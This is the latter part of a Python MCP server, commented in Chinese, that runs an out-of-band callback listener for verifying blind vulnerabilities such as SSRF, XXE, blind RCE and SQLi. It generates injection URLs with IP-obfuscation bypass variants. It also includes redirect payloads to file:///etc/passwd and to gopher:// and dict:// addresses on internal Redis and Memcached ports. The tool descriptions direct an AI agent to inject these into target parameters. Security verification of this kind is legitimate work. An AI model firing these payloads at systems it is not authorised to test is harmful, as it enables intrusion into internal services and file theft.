    except Exception:
        lines.append("  (解析失败)")
    lines.append("")
    lines.append("请求体（%d 字节%s）:" % (
        r["body_len"] or 0, "，已截断" if r["truncated"] else ""))
    lines.append(r["body"] if r["body"] else "  (空)")
    return "\n".join(lines), False


def tool_status(args):
    init_db()
    conn = db()
    try:
        sess = conn.execute(
            "SELECT s.*, (SELECT COUNT(*) FROM hits h WHERE h.session_id=s.id) AS n "
            "FROM sessions s ORDER BY s.created_at DESC LIMIT 15"
        ).fetchall()
        total_hits = conn.execute("SELECT COUNT(*) FROM hits").fetchone()[0]
    finally:
        conn.close()

    lines = []
    ports_now, owner = listener_ports()
    lines.append("监听端口 : %s（%s）" % (
        ", ".join(str(p) for p in ports_now) or "无", owner))
    if owner != "本进程" and ports_now:
        lines.append("本进程   : 降级为只读，收包由常驻监听器负责，功能正常")
    if _listener_state["failed"] and owner == "本进程":
        lines.append("绑定失败 : %s（被其他实例占用，稍后会自动接管）" %
                     ", ".join("%d(%s)" % (p, brief(e, 40)) for p, e in _listener_state["failed"]))
    lines.append("回连主机 : %s" % detect_public_host())
    lines.append("请求统计 : 总收 %d 次，其中无 token 噪音 %d 次" % (
        _listener_state["total"], _listener_state["noise"]))
    lines.append("累计命中 : %d 条" % total_hits)
    try:
        import shutil
        du = shutil.disk_usage("/")
        lines.append("磁盘     : 已用 %.1f%%，剩 %.1fG" % (
            100.0 * du.used / du.total, du.free / float(1 << 30)))
    except Exception:
        pass
    lines.append("")
    if not sess:
        lines.append("暂无会话。用 oob_new_session 开始。")
        return "\n".join(lines), False
    lines.append("会话列表（最近 15 个）:")
    for s in sess:
        state = "已关闭" if s["closed_at"] else "活跃"
        lines.append("  %s  %s  %-16s 命中 %d  %s" % (
            s["id"], fmt_ts(s["created_at"]), brief(s["label"] or "-", 16),
            s["n"], state))
    return "\n".join(lines), False


def tool_close(args):
    sid = str(args.get("session_id") or "").strip()
    if not sid:
        raise ToolError("缺少 session_id")
    init_db()
    conn = db()
    try:
        n = conn.execute(
            "UPDATE sessions SET closed_at=? WHERE id=? AND closed_at IS NULL", (now_ts(), sid)
        ).rowcount
        conn.commit()
        hits = conn.execute("SELECT COUNT(*) FROM hits WHERE session_id=?", (sid,)).fetchone()[0]
    finally:
        conn.close()
    if not n:
        return "会话 %s 不存在或已关闭。" % sid, False
    return "会话 %s 已关闭（共记录 %d 条命中）。关闭后该 token 的回连不再入库。" % (sid, hits), False


def assess_capability(session_id):
    """从命中记录里还原回连方的能力证据。

    返回 (等级, 证据字典, 结论文本)。等级越高说明这个回连能做的事越多。
    """
    init_db()
    conn = db()
    try:
        rows = conn.execute(
            "SELECT variant, method, headers, path FROM hits WHERE session_id=?", (session_id,)
        ).fetchall()
    finally:
        conn.close()

    variants = set()
    auth_seen = False
    weak = False          # 早期 payload 的回连（与能力探测无关）
    for r in rows:
        v = (r["variant"] or "").strip()
        if v.startswith("cap_"):
            variants.add(v)
            if v == "cap_a3":
                try:
                    h = json.loads(r["headers"] or "{}")
                except Exception:
                    h = {}
                if any(k.lower() == "authorization" for k in h):
                    auth_seen = True
        elif v:
            weak = True

    ev = {
        "reach": weak or bool(variants),   # L1 能出网
        "follow_1": "cap_a2" in variants,  # L2 跟随一次 302
        "follow_2": "cap_a3" in variants,  # L3 连续跟随
        "auth_retry": auth_seen,           # L4 遇 401 带凭据重试
        "big_body": "cap_a4" in variants,  # L5 接受 1MB 响应
        "xproto_issued": "cap_file" in variants or "cap_gopher" in variants,
    }

    if not ev["reach"]:
        level, verdict = 0, "尚无回连证据。"
    elif ev["big_body"]:
        level = 5
        verdict = ("回连方可跟随重定向、处理认证挑战并完整接收大响应（L5）。"
                   "这属于「渲染型客户端」，不只是盲探测——具备把内网响应内容带回给攻击者的条件，"
                   "可按「有回显 SSRF」尝试读取内网服务与云元数据。")
    elif ev["follow_2"]:
        level = 4
        verdict = ("回连方可链式跟随重定向（L4），说明它按 URL 语义解析并自动跳转，"
                   "可被诱导访问我们指定的任意 http 下一跳；内网探测能力明显强于盲 SSRF。")
    elif ev["follow_1"]:
        level = 3
        verdict = ("回连方会跟随一次重定向（L3），但未走完链条——可能限制跳转次数或跨路径校验。")
    elif weak:
        level = 1
        verdict = ("仅观测到单向回连（L1）：能发起 HTTP 请求，但未跟随重定向。"
                   "属于典型盲 SSRF——能证明目标可出网/可被诱导发起请求，"
                   "但拿不到响应内容，无法据此读取目标本地文件。")
    else:
        level = 0
        verdict = "只有能力探测请求，尚未收到普通载荷回连。"

    return level, ev, verdict


LEVEL_NAMES = {
    0: "L0 无回连",
    1: "L1 单向回连（盲）",
    3: "L3 跟随一次重定向",
    4: "L4 链式跟随重定向",
    5: "L5 渲染型（可用大响应）",
}


def tool_capability(args):
    """生成能力探测载荷，并给出当前已观测到的能力等级。"""
    sid = str(args.get("session_id") or "").strip()
    if not sid:
        raise ToolError("缺少 session_id")
    init_db()
    conn = db()
    try:
        row = conn.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone()
    finally:
        conn.close()
    if not row:
        raise ToolError("会话 %s 不存在" % sid)

    host = detect_public_host()
    _lp, _ = listener_ports()
    port = (_lp or PORTS)[0]
    base = "http://%s:%d/t/%s/cap_" % (host, port, row["token"])
    level, ev, verdict = assess_capability(sid)

    lines = ["能力探测（会话 %s）" % sid, ""]
    lines.append("注入顺序：只需把下面第一条注入目标参数，后面几跳会由目标自己的重定向跟随自动完成。")
    lines.append("")
    lines.append("① 自动链（测跟随/认证/大响应）：")
    lines.append("   %sa1" % base)
    lines.append("   → 目标若跟随，会自动依次请求 a2 → a3(401) → a4(1MB)")
    lines.append("")
    lines.append("② 跨协议跃迁（需手动注入，用于测 file:// / gopher:// / dict:// 是否被放行）：")
    lines.append("   %sfile      → 302 到 file:///etc/passwd" % base)
    lines.append("   %sgopher    → 302 到 gopher://127.0.0.1:6379/_PING" % base)
    lines.append("   %sdict      → 302 到 dict://127.0.0.1:11211/stats" % base)
    lines.append("   注意：跨协议跳转目标通常不会回连，收不到属正常——它只能证明「我们给了这个跳转」，")
    lines.append("   无法证明目标读成功。要确认 file:// 实际可读，必须有回显通道或 Windows UNC 侧信道。")
    lines.append("")
    lines.append("③ 当前证据：")
    lines.append("   出网回连     : %s" % ("✓" if ev["reach"] else "✗"))
    lines.append("   跟随一次 302 : %s" % ("✓" if ev["follow_1"] else "✗"))
    lines.append("   链式跟随     : %s" % ("✓" if ev["follow_2"] else "✗"))
    lines.append("   带认证重试   : %s" % ("✓" if ev["auth_retry"] else "✗"))
    lines.append("   接受 1MB 响应: %s" % ("✓" if ev["big_body"] else "✗"))
    lines.append("")
    lines.append("④ 判定：%s" % LEVEL_NAMES.get(level, "L%d" % level))
    lines.append("   %s" % verdict)
    return "\n".join(lines), False


def tool_selftest(args):
    """自检：库可写、端口在听、本机能从公网地址打回自己。"""
    init_db()
    lines = ["OOB 自检", ""]

    # 1. 库
    try:
        conn = db()
        try:
            conn.execute("SELECT COUNT(*) FROM hits").fetchone()
        finally:
            conn.close()
        lines.append("✓ SQLite 可读写: %s" % DB_PATH)
    except Exception as e:
        lines.append("✗ SQLite 异常: %s" % e)

    # 2. 端口监听
    _ports, _owner = listener_ports()
    if _ports:
        if _owner == "本进程":
            lines.append("✓ 监听中: %s" % ", ".join(str(p) for p in _ports))
        else:
            lines.append("✓ 监听正常: %s（由%s提供，本进程只读）" % (
                ", ".join(str(p) for p in _ports), _owner))
    else:
        lines.append("✗ 无端口在听，检查 OOB_PORTS 与 oob-listen.service 状态")

    # 3. 公网回连自测：从本机用公网地址打自己
    import urllib.request
    sid = new_session_id()
    token = new_token()
    conn = db()
    try:
        conn.execute(
            "INSERT INTO sessions(id,token,label,note,created_at,extra_hosts) VALUES (?,?,?,?,?,?)",
            (sid, token, "__selftest__", None, now_ts(), "[]"),
        )
        conn.commit()
    finally:
        conn.close()

    host = detect_public_host()
    ports_now = _ports or PORTS
    ok_any = False

    if is_private_ip(host):
        lines.append("⚠ 回连主机探测为内网地址 %s（本机公网 IP 为 NAT 映射）" % host)
        lines.append("  → 载荷里的 IP 目标连不到，必须在 %s 写入 OOB_PUBLIC_HOST=<公网IP>" % CONF_PATH)
        # 至少验证监听本身是通的
        for port in ports_now:
            url = "http://127.0.0.1:%d/t/%s/selftest" % (port, token)
            try:
                with urllib.request.urlopen(
                        urllib.request.Request(url, headers={"User-Agent": "oob-selftest/1.0"}),
                        timeout=5) as resp:
                    resp.read(64)
                ok_any = True
                lines.append("✓ 本地监听可达: 127.0.0.1:%d" % port)
            except Exception as e:
                lines.append("✗ 本地监听不可达: 127.0.0.1:%d (%s)" % (port, brief(e, 80)))
    else:
        for port in ports_now:
            url = "http://%s:%d/t/%s/selftest" % (host, port, token)
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "oob-selftest/1.0"})
                with urllib.request.urlopen(req, timeout=6) as resp:
                    resp.read(64)
                ok_any = True
                lines.append("✓ 公网地址可达: %s" % url)
            except Exception as e:
                lines.append("✗ 公网地址不可达: %s (%s)" % (url, brief(e, 80)))

    time.sleep(0.4)
    conn = db()
    try:
        n = conn.execute("SELECT COUNT(*) FROM hits WHERE session_id=?", (sid,)).fetchone()[0]
        conn.execute("DELETE FROM hits WHERE session_id=?", (sid,))
        conn.execute("DELETE FROM sessions WHERE id=?", (sid,))
        conn.commit()
    finally:
        conn.close()
    if n:
        lines.append("✓ 命中已落库（自测记录 %d 条，已清理）" % n)
    else:
        lines.append("✗ 自测请求没有落库，检查 token 匹配逻辑")

    lines.append("")
    if is_private_ip(host):
        if ok_any and n:
            lines.append("结论：监听与落库正常，但回连主机未配置。补上 OOB_PUBLIC_HOST 后即可对外验证。")
        else:
            lines.append("结论：监听或落库异常，先看上面的 ✗ 项。")
    elif ok_any and n:
        lines.append("结论：回连信道工作正常，可对外发起验证。")
    else:
        lines.append("结论：信道异常。若公网不可达，先确认腾讯云安全组是否放行 %s 端口。" %
                     ",".join(str(p) for p in PORTS))
    return "\n".join(lines), False


TOOL_HANDLERS = {
    "oob_new_session": tool_new_session,
    "oob_payloads": tool_payloads,
    "oob_wait": tool_wait,
    "oob_hits": tool_hits,
    "oob_hit_detail": tool_hit_detail,
    "oob_status": tool_status,
    "oob_close": tool_close,
    "oob_capability": tool_capability,
    "oob_selftest": tool_selftest,
}


# ---------------------------------------------------------------------------
# 工具 schema
# ---------------------------------------------------------------------------

TOOLS = [
    {
        "name": "oob_new_session",
        "description": (
            "【带外验证第一步】新建一个带外（OOB）回连会话，返回可直接注入目标的回连 URL 列表。"
            "用于验证只有带外信号才能确认的漏洞：SSRF、XXE、盲 RCE、盲 SQLi、SSTI、"
            "反序列化/JNDI、图片或 PDF 渲染器出网等。"
            "返回的标准载荷形如 http://<本机公网IP>:<端口>/t/<token>/<变体tag>，"
            "同一会话内含多种 IP 书写绕过变体（十进制/十六进制/八进制/IPv6 映射/userinfo 混淆/泛解析域名），"
            "每个变体 tag 不同，命中后可反查是哪个变体穿透的。"
            "建完会话后必须先注入载荷，再调 oob_wait 等待，不要直接下结论。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "label": {
                    "type": "string",
                    "description": "会话标签，建议写「目标-漏洞类型-参数」，如 ys7-open-upload-ssrf，便于多会话并行时区分",
                },
                "note": {
                    "type": "string",
                    "description": "备注：目标 URL、注入点参数名、预期回连方式等",
                },
                "extra_hosts": {
                    "type": ["array", "string"],
                    "description": "额外的自定义回连主机（URL 或 host:port），如自有域名；留空用默认公网 IP",
                    "items": {"type": "string"},
                },
            },
        },
    },
    {
        "name": "oob_payloads",
        "description": (
            "【换变体重试】为已存在的会话重新生成回连载荷。"
            "当某个变体没有回连时，用它拿其他绕过写法（十进制 IP、十六进制、IPv6 映射、"
            "userinfo 混淆、泛解析域名等）再打一遍。variant_set=minimal 只返回标准载荷。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "会话 ID（oob_new_session 返回）"},
                "variant_set": {
                    "type": "string",
                    "enum": ["full", "bypass", "minimal"],
                    "default": "full",
                    "description": "载荷集合：full=标准+全部绕过变体，bypass=仅绕过变体，minimal=仅标准载荷",
                },
            },
            "required": ["session_id"],
        },
    },
    {
        "name": "oob_wait",
        "description": (
            "【带外验证核心】阻塞等待指定会话收到回连，最多 timeout 秒。"
            "注入载荷后立刻调用它。收到命中时返回完整请求信息（方法/路径/来源IP/UA/请求体）"
            "并给出判定要点；等待超时则返回未命中的可能原因清单（不是工具错误）。"
            "注意：未回连 ≠ 无漏洞（目标可能不出网或载荷被拦），应换变体重试或改用内网探测手法。"
            "多个意图并行时用 after_hit_id 只取更新的命中，避免重复读到同一条。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "会话 ID"},
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "minimum": 1,
                    "maximum": 300,
                    "description": "最长等待秒数，默认 60。异步触发（队列/定时任务）建议给到 120-300",
                },
                "after_hit_id": {
                    "type": "integer",
                    "default": 0,
                    "description": "只返回 id 大于该值的命中，用于连续轮询时不重复读旧命中",
                },
            },
            "required": ["session_id"],
        },
    },
    {
        "name": "oob_hits",
        "description": (
            "列出命中记录（默认最近 30 条）。不传 session_id 则查全部会话。"
            "用于复盘一次验证里所有回连，或确认是否有扫描器噪音。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "会话 ID，留空查全部"},
                "limit": {
                    "type": "integer",
                    "default": 30,
                    "minimum": 1,
                    "maximum": 200,
                    "description": "返回条数上限，默认 30",
                },
            },
        },
    },
    {
        "name": "oob_hit_detail",
        "description": (
            "查看单条命中的完整请求头与请求体（最多 64KB）。"
            "写漏洞证据、判断注入是否带出数据、确认请求方法/Content-Type 时用它。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "hit_id": {"type": "integer", "description": "命中 ID（oob_hits 或 oob_wait 返回）"},
            },
            "required": ["hit_id"],
        },
    },
    {
        "name": "oob_status",
        "description": (
            "查看 OOB 信道状态：监听端口、回连主机、噪音统计、磁盘余量、最近会话及各会话命中数。"
            "排查「为什么收不到」时先看它。"
        ),
        "inputSchema": {"type": "object", "properties": {}},
    },
    {
        "name": "oob_close",
        "description": "关闭会话，之后该 token 的回连不再入库。验证结束或误建会话时调用，保持台账干净。",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "会话 ID"},
            },
            "required": ["session_id"],
        },
    },
    {
        "name": "oob_capability",
        "description": (
            "【判定回连方到底能做什么】生成能力探测载荷并给出已观测到的能力等级。"
            "核心价值：区分「只能单向回连的盲 SSRF」与「能跟随重定向、能处理认证、能接收大响应的渲染型客户端」——"
            "后者才具备把内网响应带回给攻击者的条件。"
            "只需注入返回的 cap_a1 一条，后续 a2→a3(401)→a4(1MB) 由目标自己的重定向跟随自动完成。"
            "同时给出 file:// / gopher:// / dict:// 跨协议探测载荷，并明确说明这类跳转收不到回连属正常、"
            "不能据此证明目标读文件成功（读本地文件必须有回显通道或 Windows UNC 侧信道）。"
            "验证 SSRF/XXE 定性、判断能否升级为中高危时调用。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "会话 ID"},
            },
            "required": ["session_id"],
        },
    },
    {
        "name": "oob_selftest",
        "description": (
            "信道自检：验证 SQLite 可写、端口在听、本机能从公网地址打回自己并落库。"
            "首次部署、怀疑信道不通、或安全组被改过时调用。会创建并自动清理临时会话。"
        ),
        "inputSchema": {"type": "object", "properties": {}},
    },
]


def call_tool(name, arguments):
    handler = TOOL_HANDLERS.get(name)
    if handler is None:
        return ("未知工具: %s（可用: %s）" % (name, ", ".join(TOOL_HANDLERS))), True
    args = arguments if isinstance(arguments, dict) else {}
    try:
        text, is_err = handler(args)
        return text, bool(is_err)
    except ToolError as e:
        log("工具 %s 失败: %s" % (name, e))
        return ("%s 执行失败: %s" % (name, e)), True
    except Exception as e:
        log("工具 %s 异常: %s: %s" % (name, type(e).__name__, e))
        return ("%s 执行失败: %s: %s" % (name, type(e).__name__, e)), True


# ---------------------------------------------------------------------------
# JSON-RPC 分发
# ---------------------------------------------------------------------------

def handle_initialize(params):
    requested = params.get("protocolVersion") if isinstance(params, dict) else None
    proto = requested if requested in SUPPORTED_PROTOCOLS else DEFAULT_PROTOCOL
    return {
        "protocolVersion": proto,
        "capabilities": {"tools": {"listChanged": False}},
        "serverInfo": {"name": SERVER_NAME, "version": SERVER_VERSION},
    }


def handle_tools_list(_params):
    return {"tools": TOOLS}


def handle_tools_call(params):
    if not isinstance(params, dict):
        raise ValueError("tools/call 的 params 必须是对象")
    name = params.get("name")
    if not isinstance(name, str) or not name:
        raise ValueError("tools/call 缺少工具名 name")
    text, is_err = call_tool(name, params.get("arguments"))
    return {"content": [{"type": "text", "text": text}], "isError": is_err}


def dispatch(method, params):
    if method == "initialize":
        return handle_initialize(params)
    if method == "ping":
        return {}
    if method == "tools/list":
        return handle_tools_list(params)
    if method == "tools/call":
        return handle_tools_call(params)
    if method == "resources/list":
        return {"resources": []}
    if method == "resources/templates/list":
        return {"resourceTemplates": []}
    if method == "prompts/list":
        return {"prompts": []}
    if method == "logging/setLevel":
        return {}
    raise KeyError(method)


def main():
    # 独立监听模式：只起收包线程，不读 stdin。交给 systemd 常驻。
    # 这样收包不再依赖某个 worker 的 MCP 子进程存活——MCP 随 worker 回收，监听器不该跟着死。
    if "--listen-only" in sys.argv:
        try:
            os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
        except Exception:
            pass
        log("=== OOB 独立监听器启动 (pid=%d) ===" % os.getpid())
        start_listeners()
        try:
            while True:
                time.sleep(300)
        except KeyboardInterrupt:
            pass
        return 0

    reader = FramedReader(sys.stdin.buffer)
    writer = FramedWriter(sys.stdout.buffer)

    try:
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    except Exception:
        pass
    log("=== %s MCP 服务器启动 (pid=%d, python=%s) ===" % (
        SERVER_NAME, os.getpid(), sys.version.split()[0]))

    # 监听器先起来，工具调用时才能立刻收包
    try:
        start_listeners()
    except Exception as e:
        log("监听器启动失败（降级为只读）: %s: %s" % (type(e).__name__, e))

    while True:
        raw = reader.read_message()
        if raw is None:
            log("stdin 已关闭，退出")
            break
        writer.sync(reader.mode)
        if not raw.strip():
            continue

        try:
            msg = json.loads(raw)
        except Exception as e:
            log("报文 JSON 解析失败: %s" % e)
            writer.send({"jsonrpc": "2.0", "id": None,
                         "error": {"code": ERR_PARSE, "message": "JSON 解析失败: %s" % e}})
            continue

        if not isinstance(msg, dict):
            writer.send({"jsonrpc": "2.0", "id": None,
                         "error": {"code": ERR_INVALID_REQUEST, "message": "报文必须是 JSON 对象"}})
            continue

        method = msg.get("method")
        msg_id = msg.get("id", None)
        has_id = "id" in msg
        params = msg.get("params")

        if not has_id:
            continue

        if not isinstance(method, str) or not method:
            writer.send({"jsonrpc": "2.0", "id": msg_id,
                         "error": {"code": ERR_INVALID_REQUEST, "message": "缺少 method 字段"}})
            continue

        try:
            result = dispatch(method, params)
            writer.send({"jsonrpc": "2.0", "id": msg_id, "result": result})
            if method == "tools/call":
                tname = params.get("name") if isinstance(params, dict) else "?"
                log("tools/call %s 已返回" % tname)
        except KeyError:
            writer.send({"jsonrpc": "2.0", "id": msg_id,
                         "error": {"code": ERR_METHOD_NOT_FOUND,
                                   "message": "未实现的方法: %s" % method}})
        except ValueError as e:
            writer.send({"jsonrpc": "2.0", "id": msg_id,
                         "error": {"code": ERR_INVALID_PARAMS, "message": str(e)}})
        except Exception as e:
            log("处理方法 %s 异常: %s: %s" % (method, type(e).__name__, e))
            writer.send({"jsonrpc": "2.0", "id": msg_id,
                         "error": {"code": ERR_INTERNAL,
                                   "message": "%s: %s" % (type(e).__name__, e)}})

    log("=== %s MCP 服务器退出 ===" % SERVER_NAME)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as e:
        try:
            sys.stderr.write("oob_mcp 致命错误: %s: %s\n" % (type(e).__name__, e))
        except Exception:
            pass
        log("致命错误: %s: %s" % (type(e).__name__, e))
        sys.exit(1)
